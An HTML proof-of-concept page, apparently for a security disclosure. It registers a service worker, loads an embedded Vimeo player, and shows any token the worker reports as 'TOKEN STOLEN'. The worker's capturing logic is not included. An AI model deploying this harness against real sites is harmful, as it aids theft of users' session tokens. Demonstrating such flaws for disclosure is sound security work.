<!DOCTYPE html>
<html>
<head>
    <title>Service Worker Attack</title>
</head>
<body>
    <h1>Service Worker Token Theft</h1>
    <button onclick="registerSW()">1. Register Service Worker</button>
    <button onclick="loadVimeo()">2. Load Vimeo (after SW registered)</button>
    <iframe id="vimeo" style="width:640px;height:360px"></iframe>

    <script>
        async function registerSW() {
            try {
                // Register service worker
                const reg = await navigator.serviceWorker.register('/sw.js');
                console.log('âœ… Service Worker registered:', reg);
                alert('Service Worker registered. Now click "Load Vimeo"');
            } catch (e) {
                console.error('âŒ SW registration failed:', e);
            }
        }

        function loadVimeo() {
            document.getElementById('vimeo').src = 
                'https://player.vimeo.com/video/935884964';
        }

        // Listen for messages from service worker
        navigator.serviceWorker.addEventListener('message', (event) => {
            console.log('Message from SW:', event.data);
            
            if (event.data.type === 'TOKEN_FOUND') {
                console.log('ðŸš¨ TOKEN STOLEN:', event.data.token);
                alert('TOKEN STOLEN: ' + event.data.token);
            }
        });
    </script>
</body>
</html>
